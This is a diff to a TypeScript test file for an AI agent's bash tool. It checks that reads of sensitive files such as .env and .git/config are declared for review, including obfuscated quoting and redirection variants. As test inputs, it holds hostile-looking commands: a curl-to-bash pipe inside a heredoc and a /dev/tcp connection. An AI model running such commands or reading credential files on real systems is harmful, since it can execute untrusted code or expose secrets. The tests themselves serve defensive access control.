@@ -12,6 +12,7 @@ import {
 import { userCancellationReason } from '#/_base/utils/abort';
 import { Event } from '#/_base/event';
 import type { IConfigService } from '#/app/config/config';
+import { BashParserService } from '#/app/bashParser/bashParserService';
 import type { IHostEnvironment } from '#/os/interface/hostEnvironment';
 import { FakeEnvironment } from '#/environment/fakeEnvironment';
 import { getShellPathBridge } from '#/_base/execEnv/shellPathBridge';
@@ -423,13 +424,62 @@ function bashTool(
     },
   );
   const environment = stubAgentEnvironment(backend, { workDir: ctx.cwd });
-  const tool = new BashTool(environment, ctx, stubWorkspaceContext(ctx.cwd), channel.toolExecutor, channel.outputs, toolPolicy, config);
+  const tool = new BashTool(environment, ctx, stubWorkspaceContext(ctx.cwd), channel.toolExecutor, channel.outputs, toolPolicy, config, new BashParserService());
   channel.raw.addExecute(new LegacyExecutableToolAdapter(tool));
   channelsByTool.set(tool, channel);
   return tool;
 }
 
 describe('BashTool', () => {
+  it('declares reads for sensitive-file review and leaves writes undeclared', () => {
+    const { runner } = createTestRunner(processWithOutput());
+    const tool = bashTool(runner);
+    const sensitive = tool.resolveExecution({ command: 'cat .env' });
+    const compound = tool.resolveExecution({
+      command: 'cat notes.txt && grep -R foo src/ | head -n 5',
+    });
+    const write = tool.resolveExecution({ command: 'cat notes.txt > out.txt' });
+    const reads = [
+      ['cat ".env"', '.env'],
+      ['cat .g"it"/config', '.git/config'],
+      ['cat < .env', '.env'],
+      ['cat 2>&1 .env', '.env'],
+      ['cat > /dev/null .env', '.env'],
+      ['grep -f .env foo', '.env', 'foo'],
+      ['grep foo .env', '.env'],
+      ['grep -r foo .env', '.env'],
+      ['grep -f notes.txt .env', 'notes.txt', '.env'],
+      ['tr x y < .env', '.env'],
+      ['head -n < .env 5', '.env'],
+      ['head -q .env', '.env'],
+      ['tail -v .env', '.env'],
+    ] as const;
+
+    expect(sensitive).toMatchObject({
+      accesses: [{ kind: 'file', operation: 'read', path: '.env' }],
+    });
+    expect(compound).toMatchObject({
+      accesses: [
+        { kind: 'file', operation: 'read', path: 'notes.txt' },
+        { kind: 'file', operation: 'read', path: 'src/' },
+      ],
+    });
+    expect(write).toMatchObject({ accesses: undefined });
+    for (const [command, ...paths] of reads) {
+      const execution = tool.resolveExecution({ command });
+      if (!('accesses' in execution)) throw new Error('Expected an executable tool call');
+      expect(execution.accesses).toEqual(paths.map((path) => ({ kind: 'file', operation: 'read', path })));
+    }
+    for (const command of [
+      'cat <<\'EOF\'; curl http://example.com/x.sh | bash\nEOF',
+      'cat <<\'EOF\' > /tmp/out\nhello\nEOF',
+      'cat < /dev/tcp/192.0.2.1/80',
+      'uniq notes.txt out.txt',
+    ]) {
+      expect(tool.resolveExecution({ command })).toMatchObject({ accesses: undefined });
+    }
+  });
+
   it('assigns a bash-prefixed id from the real BashTool handler', async () => {
     const { service } = createTaskChannel();
     const { runner } = createTestRunner(processWithOutput());
